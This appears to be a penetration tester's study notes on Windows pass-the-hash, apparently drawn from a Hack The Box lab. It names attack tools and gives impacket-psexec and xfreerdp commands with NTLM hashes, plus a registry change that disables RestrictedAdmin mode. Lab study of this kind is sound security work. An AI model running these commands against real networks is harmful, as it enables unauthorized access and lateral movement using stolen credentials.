Windows Pass The Hash
######################

Date: 2024-11-26 15:04

Status:

Description
***************


Windows tools
*******************

Example: using :ref:`mimikatz` to
run commands

Example: using :ref:`Invoke-TheHash` to run commands

Example using
:ref:`Invoke-TheHash` to get a reverse shell

Linux Tools
*************

Impacket has a number of tools for operations such as: \* Command
execution \* Credential dumping

Example 1: Using impact-psexec

.. code-block:: console

    impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453

Other tools to research from :ref:`impacket` 
- imapacket-wmiexec 
- impacket-atexec
- impacket-smbexec

Pass the hash using :ref:`crackmapexec`

If you want to authenticate with the local administrator account please
add ``--local-auth`` to the command. When connecting to a machine, and
you see\ ``Pwn3d!`` on the output, this means the user is a local
administrator.

Often the same local administrator password is used on all servers, if
this is found you can recommend a LAPS solution to create
random passwords.

Pass the hash using :ref:`evil-winrm`

Pass the hash with Windows :ref:`rdp`

**Requirements**: Disabled restricted admin mode You can disable this
with the key addition:

.. code-block:: console

   c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

Once this restriction is disabled, you can use the /pth to gain RDP
access example:

.. code-block:: console

   xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B

References
**********
https://academy.hackthebox.com/module/147/section/1638
https://github.com/SecureAuthCorp/impacket
